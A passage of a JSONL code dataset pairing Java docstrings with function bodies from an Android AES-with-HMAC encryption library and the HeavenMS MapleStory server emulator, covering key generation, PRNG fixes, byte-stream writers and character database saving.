{"docstring": "/**\n * Constructs a new bundle of ciphertext and IV from a string of the\n * format <code>base64(iv):base64(ciphertext)</code>.\n *\n * @param base64IvAndCiphertext A string of the format\n *            <code>iv:ciphertext</code> The IV and ciphertext must each\n *            be base64-encoded.\n */\n", "func_signal": "public CipherTextIvMac(String base64IvAndCiphertext)", "code": "{\n    String[] civArray = base64IvAndCiphertext.split(\":\");\n    if (civArray.length != 3) {\n        throw new IllegalArgumentException(\"Cannot parse iv:mac:ciphertext\");\n    } else {\n        iv = Base64.decode(civArray[0], BASE64_FLAGS);\n        mac = Base64.decode(civArray[1], BASE64_FLAGS);\n        cipherText = Base64.decode(civArray[2], BASE64_FLAGS);\n    }\n}", "path": "aes-crypto\\src\\main\\java\\com\\tozny\\crypto\\android\\AesCbcWithIntegrity.java", "repo_name": "tozny/java-aes-crypto", "stars": 735, "license": "mit", "language": "java", "size": 233}
{"docstring": "/**\n * Copy the elements from the start to the end\n *\n * @param from  the source\n * @param start the start index to copy\n * @param end   the end index to finish\n * @return the new buffer\n */\n", "func_signal": "private static byte[] copyOfRange(byte[] from, int start, int end)", "code": "{\n    int length = end - start;\n    byte[] result = new byte[length];\n    System.arraycopy(from, start, result, 0, length);\n    return result;\n}", "path": "aes-crypto\\src\\main\\java\\com\\tozny\\crypto\\android\\AesCbcWithIntegrity.java", "repo_name": "tozny/java-aes-crypto", "stars": 735, "license": "mit", "language": "java", "size": 233}
{"docstring": "/**\n * A function that generates random AES and HMAC keys and prints out exceptions but\n * doesn't throw them since none should be encountered. If they are\n * encountered, the return value is null.\n *\n * @return The AES and HMAC keys.\n * @throws GeneralSecurityException if AES is not implemented on this system,\n *                                  or a suitable RNG is not available\n */\n", "func_signal": "public static SecretKeys generateKey() throws GeneralSecurityException", "code": "{\n    fixPrng();\n    KeyGenerator keyGen = KeyGenerator.getInstance(CIPHER);\n    // No need to provide a SecureRandom or set a seed since that will\n    // happen automatically.\n    keyGen.init(AES_KEY_LENGTH_BITS);\n    SecretKey confidentialityKey = keyGen.generateKey();\n\n    //Now make the HMAC key\n    byte[] integrityKeyBytes = randomBytes(HMAC_KEY_LENGTH_BITS / 8);//to get bytes\n    SecretKey integrityKey = new SecretKeySpec(integrityKeyBytes, HMAC_ALGORITHM);\n\n    return new SecretKeys(confidentialityKey, integrityKey);\n}", "path": "aes-crypto\\src\\main\\java\\com\\tozny\\crypto\\android\\AesCbcWithIntegrity.java", "repo_name": "tozny/java-aes-crypto", "stars": 735, "license": "mit", "language": "java", "size": 233}
{"docstring": "/**\n * Generates a device- and invocation-specific seed to be mixed into the\n * Linux PRNG.\n */\n", "func_signal": "private static byte[] generateSeed()", "code": "{\n    try {\n        ByteArrayOutputStream seedBuffer = new ByteArrayOutputStream();\n        DataOutputStream seedBufferOut = new DataOutputStream(seedBuffer);\n        seedBufferOut.writeLong(System.currentTimeMillis());\n        seedBufferOut.writeLong(System.nanoTime());\n        seedBufferOut.writeInt(Process.myPid());\n        seedBufferOut.writeInt(Process.myUid());\n        seedBufferOut.write(BUILD_FINGERPRINT_AND_DEVICE_SERIAL);\n        seedBufferOut.close();\n        return seedBuffer.toByteArray();\n    } catch (IOException e) {\n        throw new SecurityException(\"Failed to generate seed\", e);\n    }\n}", "path": "aes-crypto\\src\\main\\java\\com\\tozny\\crypto\\android\\AesCbcWithIntegrity.java", "repo_name": "tozny/java-aes-crypto", "stars": 735, "license": "mit", "language": "java", "size": 233}
{"docstring": "/**\n * Encodes this ciphertext, IV, mac as a string.\n *\n * @return base64(iv) : base64(mac) : base64(ciphertext).\n * The iv and mac go first because they're fixed length.\n */\n", "func_signal": "@Override\npublic String toString()", "code": "{\n    String ivString = Base64.encodeToString(iv, BASE64_FLAGS);\n    String cipherTextString = Base64.encodeToString(cipherText, BASE64_FLAGS);\n    String macString = Base64.encodeToString(mac, BASE64_FLAGS);\n    return String.format(ivString + \":\" + macString + \":\" + cipherTextString);\n}", "path": "aes-crypto\\src\\main\\java\\com\\tozny\\crypto\\android\\AesCbcWithIntegrity.java", "repo_name": "tozny/java-aes-crypto", "stars": 735, "license": "mit", "language": "java", "size": 233}
{"docstring": "/**\n * Encodes the two keys as a string\n * @return base64(confidentialityKey):base64(integrityKey)\n */\n", "func_signal": "@Override\npublic String toString ()", "code": "{\n    return Base64.encodeToString(getConfidentialityKey().getEncoded(), BASE64_FLAGS)\n            + \":\" + Base64.encodeToString(getIntegrityKey().getEncoded(), BASE64_FLAGS);\n}", "path": "aes-crypto\\src\\main\\java\\com\\tozny\\crypto\\android\\AesCbcWithIntegrity.java", "repo_name": "tozny/java-aes-crypto", "stars": 735, "license": "mit", "language": "java", "size": 233}
{"docstring": "/**\n * Installs a Linux PRNG-backed {@code SecureRandom} implementation as\n * the default. Does nothing if the implementation is already the\n * default or if there is not need to install the implementation.\n *\n * @throws SecurityException if the fix is needed but could not be\n *             applied.\n */\n", "func_signal": "private static void installLinuxPRNGSecureRandom() throws SecurityException", "code": "{\n    if (Build.VERSION.SDK_INT > VERSION_CODE_JELLY_BEAN_MR2) {\n        // No need to apply the fix\n        return;\n    }\n\n    // Install a Linux PRNG-based SecureRandom implementation as the\n    // default, if not yet installed.\n    Provider[] secureRandomProviders = Security.getProviders(\"SecureRandom.SHA1PRNG\");\n\n    // Insert and check the provider atomically.\n    // The official Android Java libraries use synchronized methods for\n    // insertProviderAt, etc., so synchronizing on the class should\n    // make things more stable, and prevent race conditions with other\n    // versions of this code.\n    synchronized (java.security.Security.class) {\n        if ((secureRandomProviders == null)\n                || (secureRandomProviders.length < 1)\n                || (!secureRandomProviders[0].getClass().getSimpleName().equals(\"LinuxPRNGSecureRandomProvider\"))) {\n            Security.insertProviderAt(new LinuxPRNGSecureRandomProvider(), 1);\n        }\n\n        // Assert that new SecureRandom() and\n        // SecureRandom.getInstance(\"SHA1PRNG\") return a SecureRandom backed\n        // by the Linux PRNG-based SecureRandom implementation.\n        SecureRandom rng1 = new SecureRandom();\n        if (!rng1.getProvider().getClass().getSimpleName().equals(\"LinuxPRNGSecureRandomProvider\")) {\n            if (ALLOW_BROKEN_PRNG) {\n                Log.w(PrngFixes.class.getSimpleName(),\n                        \"new SecureRandom() backed by wrong Provider: \" + rng1.getProvider().getClass());\n                return;\n            } else {\n                throw new SecurityException(\"new SecureRandom() backed by wrong Provider: \"\n                        + rng1.getProvider().getClass());\n            }\n        }\n\n        SecureRandom rng2 = null;\n        try {\n            rng2 = SecureRandom.getInstance(\"SHA1PRNG\");\n        } catch (NoSuchAlgorithmException e) {\n            if (ALLOW_BROKEN_PRNG) {\n                Log.w(PrngFixes.class.getSimpleName(), \"SHA1PRNG not available\", e);\n                return;\n            } else {\n                new SecurityException(\"SHA1PRNG not available\", e);\n            }\n        }\n        if (!rng2.getProvider().getClass().getSimpleName().equals(\"LinuxPRNGSecureRandomProvider\")) {\n            if (ALLOW_BROKEN_PRNG) {\n                Log.w(PrngFixes.class.getSimpleName(),\n                        \"SecureRandom.getInstance(\\\"SHA1PRNG\\\") backed by wrong\" + \" Provider: \"\n                        + rng2.getProvider().getClass());\n                return;\n            } else {\n                throw new SecurityException(\n                        \"SecureRandom.getInstance(\\\"SHA1PRNG\\\") backed by wrong\" + \" Provider: \"\n                                + rng2.getProvider().getClass());\n            }\n        }\n    }\n}", "path": "aes-crypto\\src\\main\\java\\com\\tozny\\crypto\\android\\AesCbcWithIntegrity.java", "repo_name": "tozny/java-aes-crypto", "stars": 735, "license": "mit", "language": "java", "size": 233}
{"docstring": "/**\n * Construct the secret keys container.\n * @param confidentialityKeyIn The AES key\n * @param integrityKeyIn the HMAC key\n */\n", "func_signal": "public SecretKeys(SecretKey confidentialityKeyIn, SecretKey integrityKeyIn)", "code": "{\n    setConfidentialityKey(confidentialityKeyIn);\n    setIntegrityKey(integrityKeyIn);\n}", "path": "aes-crypto\\src\\main\\java\\com\\tozny\\crypto\\android\\AesCbcWithIntegrity.java", "repo_name": "tozny/java-aes-crypto", "stars": 735, "license": "mit", "language": "java", "size": 233}
{"docstring": "/**\n * Write a short integer to the stream.\n *\n * @param i The short integer to write.\n */\n", "func_signal": "@Override\npublic void writeShort(int i)", "code": "{\n    bos.writeByte((byte) (i & 0xFF));\n    bos.writeByte((byte) ((i >>> 8) & 0xFF));\n}", "path": "tools\\SpiderDropFetcher\\src\\tools\\data\\output\\GenericLittleEndianWriter.java", "repo_name": "ronancpl/HeavenMS", "stars": 728, "license": "agpl-3.0", "language": "java", "size": 120755}
{"docstring": "//---- \\/ \\/ \\/ \\/ \\/ \\/ \\/  NOT TESTED  \\/ \\/ \\/ \\/ \\/ \\/ \\/ \\/ \\/ ----\n", "func_signal": "public final void setQuestAdd(final MapleQuest quest, final byte status, final String customData)", "code": "{\n    synchronized (quests) {\n        if (!quests.containsKey(quest.getId())) {\n            final MapleQuestStatus stat = new MapleQuestStatus(quest, MapleQuestStatus.Status.getById((int)status));\n            stat.setCustomData(customData);\n            quests.put(quest.getId(), stat);\n        }\n    }\n}", "path": "src\\client\\MapleCharacter.java", "repo_name": "ronancpl/HeavenMS", "stars": 728, "license": "agpl-3.0", "language": "java", "size": 120755}
{"docstring": "//---- /\\ /\\ /\\ /\\ /\\ /\\ /\\  NOT TESTED  /\\ /\\ /\\ /\\ /\\ /\\ /\\ /\\ /\\ ----\n", "func_signal": "public boolean needQuestItem(int questid, int itemid)", "code": "{\n    if (questid <= 0) { //For non quest items :3\n        return true;\n    }\n    \n    int amountNeeded, questStatus = this.getQuestStatus(questid);\n    if (questStatus == 0) {\n        amountNeeded = MapleQuest.getInstance(questid).getStartItemAmountNeeded(itemid);\n        if (amountNeeded == Integer.MIN_VALUE) {\n            return false;\n        }\n    } else if (questStatus != 1) {\n        return false;\n    } else {\n        amountNeeded = MapleQuest.getInstance(questid).getCompleteItemAmountNeeded(itemid);\n        if (amountNeeded == Integer.MAX_VALUE) {\n            return true;\n        }\n    }\n    \n    return getInventory(ItemConstants.getInventoryType(itemid)).countById(itemid) < amountNeeded;\n}", "path": "src\\client\\MapleCharacter.java", "repo_name": "ronancpl/HeavenMS", "stars": 728, "license": "agpl-3.0", "language": "java", "size": 120755}
{"docstring": "/**\n * Write a long integer to the stream.\n * @param l The long integer to write.\n */\n", "func_signal": "@Override\npublic void writeLong(long l)", "code": "{\n    bos.writeByte((byte) (l & 0xFF));\n    bos.writeByte((byte) ((l >>> 8) & 0xFF));\n    bos.writeByte((byte) ((l >>> 16) & 0xFF));\n    bos.writeByte((byte) ((l >>> 24) & 0xFF));\n    bos.writeByte((byte) ((l >>> 32) & 0xFF));\n    bos.writeByte((byte) ((l >>> 40) & 0xFF));\n    bos.writeByte((byte) ((l >>> 48) & 0xFF));\n    bos.writeByte((byte) ((l >>> 56) & 0xFF));\n}", "path": "tools\\SpiderDropFetcher\\src\\tools\\data\\output\\GenericLittleEndianWriter.java", "repo_name": "ronancpl/HeavenMS", "stars": 728, "license": "agpl-3.0", "language": "java", "size": 120755}
{"docstring": "/**\n * Returns the number of bytes left in the stream.\n *\n * @return The number of bytes available for reading as a long integer.\n */\n", "func_signal": "@Override\npublic long available()", "code": "{\n    try {\n        return is.available();\n    } catch (IOException e) {\n        e.printStackTrace();\n        System.out.println(\"ERROR\" + e);\n        return 0;\n    }\n}", "path": "tools\\MapleQuestItemFetcher\\src\\tools\\data\\input\\InputStreamByteStream.java", "repo_name": "ronancpl/HeavenMS", "stars": 728, "license": "agpl-3.0", "language": "java", "size": 120755}
{"docstring": "/**\n * Returns the number of bytes left in the stream.\n *\n * @return The number of bytes available for reading as a long integer.\n */\n", "func_signal": "@Override\npublic long available()", "code": "{\n    try {\n        return is.available();\n    } catch (IOException e) {\n        e.printStackTrace();\n        System.out.println(\"ERROR\" + e);\n        return 0;\n    }\n}", "path": "tools\\SpiderDropFetcher\\src\\tools\\data\\input\\InputStreamByteStream.java", "repo_name": "ronancpl/HeavenMS", "stars": 728, "license": "agpl-3.0", "language": "java", "size": 120755}
{"docstring": "/**\n * Checks to see if two pairs are equal.\n */\n", "func_signal": "@SuppressWarnings(\"unchecked\")\n@Override\npublic boolean equals(Object obj)", "code": "{\n    if (this == obj) {\n        return true;\n    }\n    if (obj == null) {\n        return false;\n    }\n    if (getClass() != obj.getClass()) {\n        return false;\n    }\n    final Pair other = (Pair) obj;\n    if (left == null) {\n        if (other.left != null) {\n            return false;\n        }\n    } else if (!left.equals(other.left)) {\n        return false;\n    }\n    if (right == null) {\n        if (other.right != null) {\n            return false;\n        }\n    } else if (!right.equals(other.right)) {\n        return false;\n    }\n    return true;\n}", "path": "tools\\MapleInvalidItemWithNoNameFetcher\\src\\maplenoitemnamefetcher\\Pair.java", "repo_name": "ronancpl/HeavenMS", "stars": 728, "license": "agpl-3.0", "language": "java", "size": 120755}
{"docstring": "/**\n * Gets the hash code of this pair.\n */\n", "func_signal": "@Override\npublic int hashCode()", "code": "{\n    final int prime = 31;\n    int result = 1;\n    result = prime * result + ((left == null) ? 0 : left.hashCode());\n    result = prime * result + ((right == null) ? 0 : right.hashCode());\n    return result;\n}", "path": "tools\\MapleInvalidItemWithNoNameFetcher\\src\\maplenoitemnamefetcher\\Pair.java", "repo_name": "ronancpl/HeavenMS", "stars": 728, "license": "agpl-3.0", "language": "java", "size": 120755}
{"docstring": "/**\n * Write an array of bytes to the stream.\n *\n * @param b The bytes to write.\n */\n", "func_signal": "@Override\npublic void write(byte[] b)", "code": "{\n    for (int x = 0; x < b.length; x++) {\n        bos.writeByte(b[x]);\n    }\n}", "path": "tools\\SpiderDropFetcher\\src\\tools\\data\\output\\GenericLittleEndianWriter.java", "repo_name": "ronancpl/HeavenMS", "stars": 728, "license": "agpl-3.0", "language": "java", "size": 120755}
{"docstring": "/**\n * Writes a null-terminated ASCII string to the stream.\n *\n * @param s The ASCII string to write.\n */\n", "func_signal": "@Override\npublic void writeNullTerminatedAsciiString(String s)", "code": "{\n    writeAsciiString(s);\n    write(0);\n}", "path": "tools\\SpiderDropFetcher\\src\\tools\\data\\output\\GenericLittleEndianWriter.java", "repo_name": "ronancpl/HeavenMS", "stars": 728, "license": "agpl-3.0", "language": "java", "size": 120755}
{"docstring": "/**\n * Writes an integer to the stream.\n *\n * @param i The integer to write.\n */\n", "func_signal": "@Override\npublic void writeInt(int i)", "code": "{\n    bos.writeByte((byte) (i & 0xFF));\n    bos.writeByte((byte) ((i >>> 8) & 0xFF));\n    bos.writeByte((byte) ((i >>> 16) & 0xFF));\n    bos.writeByte((byte) ((i >>> 24) & 0xFF));\n}", "path": "tools\\SpiderDropFetcher\\src\\tools\\data\\output\\GenericLittleEndianWriter.java", "repo_name": "ronancpl/HeavenMS", "stars": 728, "license": "agpl-3.0", "language": "java", "size": 120755}
{"docstring": "// need to delay to ensure clientside has finished reloading character data\n", "func_signal": "@Override\n        public void run()", "code": "{\n            MapleCharacter thisChr = MapleCharacter.this;\n            MapleMap map = thisChr.getMap();\n            \n            if (map != null) {\n                map.broadcastMessage(thisChr, MaplePacketCreator.showForeignEffect(thisChr.getId(), 8), false);\n            }\n        }", "path": "src\\client\\MapleCharacter.java", "repo_name": "ronancpl/HeavenMS", "stars": 728, "license": "agpl-3.0", "language": "java", "size": 120755}
{"docstring": "/**\n * Class constructor - pairs two objects together.\n *\n * @param left The left object.\n * @param right The right object.\n */\n", "func_signal": "public Pair(E left, F right)", "code": "{\n    this.left = left;\n    this.right = right;\n}", "path": "tools\\MapleInvalidItemWithNoNameFetcher\\src\\maplenoitemnamefetcher\\Pair.java", "repo_name": "ronancpl/HeavenMS", "stars": 728, "license": "agpl-3.0", "language": "java", "size": 120755}
{"docstring": "// optimized PIN & PIC check\n", "func_signal": "public boolean canLoginBypass(String nibbleHwid, int accId, boolean pic)", "code": "{\n     try {\n         Pair<String, Integer> entry = new Pair<>(nibbleHwid, accId);\n         Boolean p = loginBypass.get(entry).getLeft();\n         \n         return !pic || p;\n     } catch (NullPointerException npe) {\n         return false;\n     }\n }", "path": "src\\net\\server\\coordinator\\login\\MapleLoginBypassCoordinator.java", "repo_name": "ronancpl/HeavenMS", "stars": 728, "license": "agpl-3.0", "language": "java", "size": 120755}
{"docstring": "/**\n * Reads the next byte from the stream.\n *\n * @return Then next byte in the stream.\n */\n", "func_signal": "@Override\npublic int readByte()", "code": "{\n    int temp;\n    try {\n        temp = is.read();\n        if (temp == -1) {\n            throw new RuntimeException(\"EOF\");\n        }\n        read++;\n        return temp;\n    } catch (IOException e) {\n        throw new RuntimeException(e);\n    }\n}", "path": "tools\\MapleQuestItemFetcher\\src\\tools\\data\\input\\InputStreamByteStream.java", "repo_name": "ronancpl/HeavenMS", "stars": 728, "license": "agpl-3.0", "language": "java", "size": 120755}
{"docstring": "/**\n * Reads the next byte from the stream.\n *\n * @return Then next byte in the stream.\n */\n", "func_signal": "@Override\npublic int readByte()", "code": "{\n    int temp;\n    try {\n        temp = is.read();\n        if (temp == -1) {\n            throw new RuntimeException(\"EOF\");\n        }\n        read++;\n        return temp;\n    } catch (IOException e) {\n        throw new RuntimeException(e);\n    }\n}", "path": "tools\\SpiderDropFetcher\\src\\tools\\data\\input\\InputStreamByteStream.java", "repo_name": "ronancpl/HeavenMS", "stars": 728, "license": "agpl-3.0", "language": "java", "size": 120755}
{"docstring": "/**\n * Writes a maple-convention ASCII string to the stream.\n *\n * @param s The ASCII string to use maple-convention to write.\n */\n", "func_signal": "@Override\npublic void writeMapleAsciiString(String s)", "code": "{\n    writeShort((short) s.length());\n    writeAsciiString(s);\n}", "path": "tools\\SpiderDropFetcher\\src\\tools\\data\\output\\GenericLittleEndianWriter.java", "repo_name": "ronancpl/HeavenMS", "stars": 728, "license": "agpl-3.0", "language": "java", "size": 120755}
{"docstring": "//Summon Skills noobs\n", "func_signal": "@Override\n    public final void handlePacket(SeekableLittleEndianAccessor slea, MapleClient c)", "code": "{\n        //System.out.println(slea.toString());\n        Collection<MapleSummon> summons = c.getPlayer().getSummonsValues();\n        int oid = slea.readInt();\n        MapleSummon summon = null;\n        for (MapleSummon sum : summons) {\n            if (sum.getObjectId() == oid) {\n                summon = sum;\n            }\n        }\n        if (summon != null) {\n            int skillId = slea.readInt();\n            if (skillId == DarkKnight.AURA_OF_BEHOLDER) {\n                slea.readShort(); //Not sure.\n            } else if (skillId == DarkKnight.HEX_OF_BEHOLDER) {\n                slea.readByte(); //Not sure.\n            }            //show to others here\n        } else {\n            c.getPlayer().clearSummons();\n        }\n    }", "path": "src\\net\\server\\channel\\handlers\\BeholderHandler.java", "repo_name": "ronancpl/HeavenMS", "stars": 728, "license": "agpl-3.0", "language": "java", "size": 120755}
{"docstring": "/**\n * Writes a 2D 4 byte position information\n *\n * @param s The Point position to write.\n */\n", "func_signal": "@Override\npublic void writePos(Point s)", "code": "{\n    writeShort(s.x);\n    writeShort(s.y);\n}", "path": "tools\\SpiderDropFetcher\\src\\tools\\data\\output\\GenericLittleEndianWriter.java", "repo_name": "ronancpl/HeavenMS", "stars": 728, "license": "agpl-3.0", "language": "java", "size": 120755}
{"docstring": "//ItemFactory saveItems and monsterbook.saveCards are the most time consuming here.\n", "func_signal": "public synchronized void saveCharToDB(boolean notAutosave)", "code": "{\n    if (!loggedIn) {\n        return;\n    }\n    \n    Calendar c = Calendar.getInstance();\n    \n    if(notAutosave) {\n        FilePrinter.print(FilePrinter.SAVING_CHARACTER, \"Attempting to save \" + name + \" at \" + c.getTime().toString());\n    } else {\n        FilePrinter.print(FilePrinter.AUTOSAVING_CHARACTER, \"Attempting to autosave \" + name + \" at \" + c.getTime().toString());\n    }\n    \n    Server.getInstance().updateCharacterEntry(this);\n    \n    Connection con = null;\n    try {\n        con = DatabaseConnection.getConnection();\n        con.setTransactionIsolation(Connection.TRANSACTION_READ_UNCOMMITTED);\n        con.setAutoCommit(false);\n        PreparedStatement ps;\n        ps = con.prepareStatement(\"UPDATE characters SET level = ?, fame = ?, str = ?, dex = ?, luk = ?, `int` = ?, exp = ?, gachaexp = ?, hp = ?, mp = ?, maxhp = ?, maxmp = ?, sp = ?, ap = ?, gm = ?, skincolor = ?, gender = ?, job = ?, hair = ?, face = ?, map = ?, meso = ?, hpMpUsed = ?, spawnpoint = ?, party = ?, buddyCapacity = ?, messengerid = ?, messengerposition = ?, mountlevel = ?, mountexp = ?, mounttiredness= ?, equipslots = ?, useslots = ?, setupslots = ?, etcslots = ?,  monsterbookcover = ?, vanquisherStage = ?, dojoPoints = ?, lastDojoStage = ?, finishedDojoTutorial = ?, vanquisherKills = ?, matchcardwins = ?, matchcardlosses = ?, matchcardties = ?, omokwins = ?, omoklosses = ?, omokties = ?, dataString = ?, fquest = ?, jailexpire = ?, partnerId = ?, marriageItemId = ?, lastExpGainTime = ?, ariantPoints = ?, partySearch = ? WHERE id = ?\", Statement.RETURN_GENERATED_KEYS);\n        ps.setInt(1, level);    // thanks CanIGetaPR for noticing an unnecessary \"level\" limitation when persisting DB data\n        ps.setInt(2, fame);\n        \n        effLock.lock();\n        statWlock.lock();\n        try {\n            ps.setInt(3, str);\n            ps.setInt(4, dex);\n            ps.setInt(5, luk);\n            ps.setInt(6, int_);\n            ps.setInt(7, Math.abs(exp.get()));\n            ps.setInt(8, Math.abs(gachaexp.get()));\n            ps.setInt(9, hp);\n            ps.setInt(10, mp);\n            ps.setInt(11, maxhp);\n            ps.setInt(12, maxmp);\n            StringBuilder sps = new StringBuilder();\n            for (int i = 0; i < remainingSp.length; i++) {\n                sps.append(remainingSp[i]);\n                sps.append(\",\");\n            }\n            String sp = sps.toString();\n            ps.setString(13, sp.substring(0, sp.length() - 1));\n            ps.setInt(14, remainingAp);\n        } finally {\n            statWlock.unlock();\n            effLock.unlock();\n        }\n        \n        ps.setInt(15, gmLevel);\n        ps.setInt(16, skinColor.getId());\n        ps.setInt(17, gender);\n        ps.setInt(18, job.getId());\n        ps.setInt(19, hair);\n        ps.setInt(20, face);\n        if (map == null || (cashshop != null && cashshop.isOpened())) {\n            ps.setInt(21, mapid);\n        } else {\n            if (map.getForcedReturnId() != 999999999) {\n                ps.setInt(21, map.getForcedReturnId());\n            } else {\n                ps.setInt(21, getHp() < 1 ? map.getReturnMapId() : map.getId());\n            }\n        }\n        ps.setInt(22, meso.get());\n        ps.setInt(23, hpMpApUsed);\n        if (map == null || map.getId() == 610020000 || map.getId() == 610020001) {  // reset to first spawnpoint on those maps\n            ps.setInt(24, 0);\n        } else {\n            MaplePortal closest = map.findClosestPlayerSpawnpoint(getPosition());\n            if (closest != null) {\n                ps.setInt(24, closest.getId());\n            } else {\n                ps.setInt(24, 0);\n            }\n        }\n        \n        prtLock.lock();\n        try {\n            if (party != null) {\n                ps.setInt(25, party.getId());\n            } else {\n                ps.setInt(25, -1);\n            }\n        } finally {\n            prtLock.unlock();\n        }\n        \n        ps.setInt(26, buddylist.getCapacity());\n        if (messenger != null) {\n            ps.setInt(27, messenger.getId());\n            ps.setInt(28, messengerposition);\n        } else {\n            ps.setInt(27, 0);\n            ps.setInt(28, 4);\n        }\n        if (maplemount != null) {\n            ps.setInt(29, maplemount.getLevel());\n            ps.setInt(30, maplemount.getExp());\n            ps.setInt(31, maplemount.getTiredness());\n        } else {\n            ps.setInt(29, 1);\n            ps.setInt(30, 0);\n            ps.setInt(31, 0);\n        }\n        for (int i = 1; i < 5; i++) {\n            ps.setInt(i + 31, getSlots(i));\n        }\n        \n        monsterbook.saveCards(getId());\n        \n        ps.setInt(36, bookCover);\n        ps.setInt(37, vanquisherStage);\n        ps.setInt(38, dojoPoints);\n        ps.setInt(39, dojoStage);\n        ps.setInt(40, finishedDojoTutorial ? 1 : 0);\n        ps.setInt(41, vanquisherKills);\n        ps.setInt(42, matchcardwins);\n        ps.setInt(43, matchcardlosses);\n        ps.setInt(44, matchcardties);\n        ps.setInt(45, omokwins);\n        ps.setInt(46, omoklosses);\n        ps.setInt(47, omokties);\n        ps.setString(48, dataString);\n        ps.setInt(49, quest_fame);\n        ps.setLong(50, jailExpiration);\n        ps.setInt(51, partnerId);\n        ps.setInt(52, marriageItemid);\n        ps.setTimestamp(53, new Timestamp(lastExpGainTime));\n        ps.setInt(54, ariantPoints);\n        ps.setBoolean(55, canRecvPartySearchInvite);\n        ps.setInt(56, id);\n\n        int updateRows = ps.executeUpdate();\n        ps.close();\n        \n        if (updateRows < 1) {\n            throw new RuntimeException(\"Character not in database (\" + id + \")\");\n        }\n        \n        List<MaplePet> petList = new LinkedList<>();\n        petLock.lock();\n        try {\n            for (int i = 0; i < 3; i++) {\n                if (pets[i] != null) {\n                    petList.add(pets[i]);\n                }\n            }\n        } finally {\n            petLock.unlock();\n        }\n        \n        for (MaplePet pet : petList) {\n            pet.saveToDb();\n        }\n        \n        for(Entry<Integer, Set<Integer>> es: getExcluded().entrySet()) {    // this set is already protected\n            try (PreparedStatement ps2 = con.prepareStatement(\"DELETE FROM petignores WHERE petid=?\")) {\n                ps2.setInt(1, es.getKey());\n                ps2.executeUpdate();\n            }\n            \n            try (PreparedStatement ps2 = con.prepareStatement(\"INSERT INTO petignores (petid, itemid) VALUES (?, ?)\")) {\n                ps2.setInt(1, es.getKey());\n                for(Integer x: es.getValue()) {\n                    ps2.setInt(2, x);\n                    ps2.addBatch();\n                }\n                ps2.executeBatch();\n            }\n        }\n        \n        deleteWhereCharacterId(con, \"DELETE FROM keymap WHERE characterid = ?\");\n        ps = con.prepareStatement(\"INSERT INTO keymap (characterid, `key`, `type`, `action`) VALUES (?, ?, ?, ?)\");\n        ps.setInt(1, id);\n        \n        Set<Entry<Integer, MapleKeyBinding>> keybindingItems = Collections.unmodifiableSet(keymap.entrySet());\n        for (Entry<Integer, MapleKeyBinding> keybinding : keybindingItems) {\n            ps.setInt(2, keybinding.getKey());\n            ps.setInt(3, keybinding.getValue().getType());\n            ps.setInt(4, keybinding.getValue().getAction());\n            ps.addBatch();\n        }\n        ps.executeBatch();\n        ps.close();\n        \n        // No quickslots, or no change.\n        boolean bQuickslotEquals = this.m_pQuickslotKeyMapped == null || (this.m_aQuickslotLoaded != null && Arrays.equals(this.m_pQuickslotKeyMapped.GetKeybindings(), this.m_aQuickslotLoaded));\n        if (!bQuickslotEquals) {\n            long nQuickslotKeymapped = LongTool.BytesToLong(this.m_pQuickslotKeyMapped.GetKeybindings());\n            \n            try (final PreparedStatement pInsertStatement = con.prepareStatement(\"INSERT INTO quickslotkeymapped (accountid, keymap) VALUES (?, ?) ON DUPLICATE KEY UPDATE keymap = ?;\")) {\n                pInsertStatement.setInt(1, this.getAccountID());\n                pInsertStatement.setLong(2, nQuickslotKeymapped);\n                pInsertStatement.setLong(3, nQuickslotKeymapped);\n                pInsertStatement.executeUpdate();\n            }\n        }\n        \n        deleteWhereCharacterId(con, \"DELETE FROM skillmacros WHERE characterid = ?\");\n        ps = con.prepareStatement(\"INSERT INTO skillmacros (characterid, skill1, skill2, skill3, name, shout, position) VALUES (?, ?, ?, ?, ?, ?, ?)\");\n        ps.setInt(1, getId());\n        for (int i = 0; i < 5; i++) {\n            SkillMacro macro = skillMacros[i];\n            if (macro != null) {\n                ps.setInt(2, macro.getSkill1());\n                ps.setInt(3, macro.getSkill2());\n                ps.setInt(4, macro.getSkill3());\n                ps.setString(5, macro.getName());\n                ps.setInt(6, macro.getShout());\n                ps.setInt(7, i);\n                ps.addBatch();\n            }\n        }\n        ps.executeBatch();\n        ps.close();\n        \n        List<Pair<Item, MapleInventoryType>> itemsWithType = new ArrayList<>();\n        for (MapleInventory iv : inventory) {\n            for (Item item : iv.list()) {\n                itemsWithType.add(new Pair<>(item, iv.getType()));\n            }\n        }\n        \n        ItemFactory.INVENTORY.saveItems(itemsWithType, id, con);\n        \t\t\n        ps = con.prepareStatement(\"REPLACE INTO skills (characterid, skillid, skilllevel, masterlevel, expiration) VALUES (?, ?, ?, ?, ?)\");\n        ps.setInt(1, id);\n        for (Entry<Skill, SkillEntry> skill : skills.entrySet()) {\n            ps.setInt(2, skill.getKey().getId());\n            ps.setInt(3, skill.getValue().skillevel);\n            ps.setInt(4, skill.getValue().masterlevel);\n            ps.setLong(5, skill.getValue().expiration);\n            ps.addBatch();\n        }\n        ps.executeBatch();\n        ps.close();\n        \n        deleteWhereCharacterId(con, \"DELETE FROM savedlocations WHERE characterid = ?\");\n        ps = con.prepareStatement(\"INSERT INTO savedlocations (characterid, `locationtype`, `map`, `portal`) VALUES (?, ?, ?, ?)\");\n        ps.setInt(1, id);\n        for (SavedLocationType savedLocationType : SavedLocationType.values()) {\n            if (savedLocations[savedLocationType.ordinal()] != null) {\n                ps.setString(2, savedLocationType.name());\n                ps.setInt(3, savedLocations[savedLocationType.ordinal()].getMapId());\n                ps.setInt(4, savedLocations[savedLocationType.ordinal()].getPortal());\n                ps.addBatch();\n            }\n        }\n        ps.executeBatch();\n        ps.close();\n        \n        deleteWhereCharacterId(con, \"DELETE FROM trocklocations WHERE characterid = ?\");\n        ps = con.prepareStatement(\"INSERT INTO trocklocations(characterid, mapid, vip) VALUES (?, ?, 0)\");\n        for (int i = 0; i < getTrockSize(); i++) {\n            if (trockmaps.get(i) != 999999999) {\n                ps.setInt(1, getId());\n                ps.setInt(2, trockmaps.get(i));\n                ps.addBatch();\n            }\n        }\n        ps.executeBatch();\n        ps.close();\n        \n        ps = con.prepareStatement(\"INSERT INTO trocklocations(characterid, mapid, vip) VALUES (?, ?, 1)\");\n        for (int i = 0; i < getVipTrockSize(); i++) {\n            if (viptrockmaps.get(i) != 999999999) {\n                ps.setInt(1, getId());\n                ps.setInt(2, viptrockmaps.get(i));\n                ps.addBatch();\n            }\n        }\n        ps.executeBatch();\n        ps.close();\n        \n        deleteWhereCharacterId(con, \"DELETE FROM buddies WHERE characterid = ? AND pending = 0\");\n        ps = con.prepareStatement(\"INSERT INTO buddies 